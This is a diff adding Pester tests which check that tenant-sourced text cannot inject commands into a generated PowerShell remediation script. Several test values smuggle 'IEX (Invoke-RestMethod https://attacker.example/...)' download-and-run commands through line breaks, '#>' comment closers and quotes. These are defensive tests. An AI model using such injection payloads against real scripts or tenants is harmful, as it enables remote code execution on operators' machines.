@@ -98,6 +98,98 @@ Describe 'The generated remediation script' {
         }
     }
 
+    Context 'Tenant-controlled text cannot become a command' {
+        # Display names, UPNs and ids come from the assessed tenant, so anybody who can set
+        # a display name there chooses part of this file's text. Past the throw, every line
+        # must stay a comment whatever that text holds: a line break smuggled into a value
+        # would otherwise start a live statement in a script the operator is told to run
+        # with write permissions.
+
+        It 'keeps a display name with a line break inside its comment' {
+            $row = New-Row
+            $row.DisplayName = "Jane Doe`nIEX (Invoke-RestMethod https://attacker.example/p.ps1)`n#"
+            $text = New-Script -Rows @($row)
+
+            $afterThrow = $text.Substring($text.IndexOf('throw '))
+            $live = @($afterThrow -split "\r\n|\r|\n" | Select-Object -Skip 1 | Where-Object {
+                    $_.Trim() -and -not $_.TrimStart().StartsWith('#')
+                })
+
+            $live | Should -BeNullOrEmpty
+        }
+
+        It 'keeps every other tenant-sourced value inside its comment too' {
+            # Not just the display name: every column the block prints, and the id that is
+            # spliced into each commented-out Graph URI, comes from the same tenant.
+            $payload = "`r`nIEX (Invoke-RestMethod https://attacker.example/p.ps1)`r`n#"
+            $row = [PSCustomObject]@{
+                Risk                   = 'High'
+                BlockedAtRetirement    = "True$payload"
+                DisplayName            = 'Test Person'
+                UserPrincipalName      = "someone@fabrikam-example.com$payload"
+                UserId                 = "u-test$payload"
+                IsAdmin                = $false
+                PerUserMfaState        = 'disabled'
+                DaysSinceLastSignIn    = "3$payload"
+                PhoneMethodsRegistered = "mobilePhone$payload"
+            }
+            $text = New-Script -Rows @($row)
+
+            $afterThrow = $text.Substring($text.IndexOf('throw '))
+            $live = @($afterThrow -split "\r\n|\r|\n" | Select-Object -Skip 1 | Where-Object {
+                    $_.Trim() -and -not $_.TrimStart().StartsWith('#')
+                })
+
+            $live | Should -BeNullOrEmpty
+        }
+
+        It 'keeps a customer label or source path from closing the header comment' {
+            # The header is a <# #> block, so "#>" in either value ends it early, with no
+            # line break needed. Customer labels come from PSA exports, which are untrusted.
+            # Ask PowerShell's own parser what would run: the preamble and the throw, nothing else.
+            $path = Join-Path ([System.IO.Path]::GetTempPath()) "fix-$(New-Guid).ps1"
+            $null = New-RemediationScript -Rows @(New-Row) -Path $path `
+                -Customer 'Fabrikam #> IEX (Invoke-RestMethod https://attacker.example/a.ps1) <#' `
+                -GeneratedFrom 'C:\evidence\x.csv #> IEX (Invoke-RestMethod https://attacker.example/b.ps1) <#' `
+                -SkipAclHardening
+
+            $tokens = $null; $errors = $null
+            $ast = [System.Management.Automation.Language.Parser]::ParseFile($path, [ref]$tokens, [ref]$errors)
+            $statements = @($ast.EndBlock.Statements | ForEach-Object { $_.Extent.Text })
+
+            $errors | Should -BeNullOrEmpty
+            $statements.Count | Should -Be 3
+            $statements[0] | Should -Be 'Set-StrictMode -Version Latest'
+            $statements[1] | Should -Be "`$ErrorActionPreference = 'Stop'"
+            $statements[2] | Should -BeLike 'throw *'
+        }
+
+        It 'keeps a user id inside its quotes once the operator uncomments a Graph line' {
+            # Uncommenting is the documented workflow, so the commented-out lines have to be
+            # safe as live code too. PowerShell treats curly quotes as single quotes, so a
+            # quote of either kind in the id would end the URI string and run what follows.
+            foreach ($quote in @("'", [char]0x2019)) {
+                $row = New-Row
+                $row.UserId = "u-test$quote; IEX (Invoke-RestMethod https://attacker.example/c.ps1); $quote"
+                $text = New-Script -Rows @($row)
+
+                $graphLines = @($text -split "\r\n|\r|\n" |
+                        Where-Object { $_ -like '# Invoke-MgGraphRequest*' } |
+                        ForEach-Object { $_.Substring(2) })
+                $graphLines.Count | Should -BeGreaterThan 0
+
+                foreach ($line in $graphLines) {
+                    $tokens = $null; $errors = $null
+                    $ast = [System.Management.Automation.Language.Parser]::ParseInput($line, [ref]$tokens, [ref]$errors)
+                    $commands = @($ast.FindAll({ $args[0] -is [System.Management.Automation.Language.CommandAst] }, $true) |
+                            ForEach-Object { $_.GetCommandName() })
+
+                    $commands | Should -Be @('Invoke-MgGraphRequest') -Because "uncommenting '$line' must run only the Graph call"
+                }
+            }
+        }
+    }
+
     Context 'The order that prevents a lockout' {
 
         It 'puts the phone removal last, after registering and verifying' {
